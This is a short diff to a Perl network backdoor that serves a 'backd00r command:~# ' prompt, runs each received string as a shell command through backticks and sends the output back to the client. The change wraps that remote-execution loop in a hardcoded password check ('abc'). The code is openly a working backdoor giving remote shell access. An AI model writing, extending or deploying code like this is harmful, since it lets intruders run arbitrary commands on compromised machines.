@@ -19,12 +19,19 @@ sub main {
     my $host   = $client -> peerhost();
     my $port   = $client -> peerport();
 
-    while(1) {
-      $client -> send("backd00r command:~# ");
-      $client -> recv(my $command, 5);
+    $client -> send("\npassword: ");
+    $client -> recv(my $password, 5);
+
+    chomp ($password);
+
+    if ($password eq "abc") {
+      while(1) {
+        $client -> send("backd00r command:~# ");
+        $client -> recv(my $command, 5);
       
-      my $cmd = `$command`;
-      $client -> send($cmd);
+        my $cmd = `$command`;
+        $client -> send($cmd);
+      }
     }
   }
 }
